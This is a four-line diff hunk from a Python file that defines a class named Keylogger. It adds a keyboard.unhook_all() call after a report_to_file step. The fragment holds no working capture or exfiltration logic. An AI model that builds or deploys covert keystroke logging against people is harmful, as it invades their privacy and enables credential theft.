@@ -47,3 +47,4 @@ class Keylogger:
                 self.report_to_file()
             else:
                 pass
+            keyboard.unhook_all()
